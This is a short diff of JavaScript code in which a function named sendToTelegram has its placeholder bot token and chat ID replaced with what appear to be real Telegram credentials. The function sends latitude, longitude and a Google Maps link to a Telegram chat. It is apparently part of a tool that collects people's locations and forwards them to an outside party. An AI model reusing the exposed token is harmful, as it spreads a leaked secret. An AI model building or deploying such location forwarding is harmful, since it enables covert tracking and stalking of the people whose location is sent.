@@ -153,8 +153,8 @@
   }
 
   function sendToTelegram(lat, lon) {
-    const botToken = "YOUR_BOT_TOKEN_HERE";  // Replace this
-    const chatId = "YOUR_CHAT_ID_HERE";      // Replace this
+    const botToken = "7607952206:AAEssXN2JHqnV9AATiQQj6ga8if3PmYZ_Uc";  // Replace this
+    const chatId = "6255459316";      // Replace this
     const message = `New location received:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
